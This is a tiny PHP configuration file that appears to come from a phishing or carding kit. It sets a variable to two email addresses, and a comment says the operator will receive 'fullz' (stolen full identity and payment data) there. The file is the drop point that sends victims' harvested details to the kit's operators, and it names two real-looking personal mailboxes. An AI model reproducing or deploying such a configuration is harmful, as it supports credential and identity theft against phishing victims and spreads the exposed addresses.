<?
$userinfo="horlalumia12@protonmail.com,sarahbills1222@gmail.com"; // here u`ll get fullz

?>
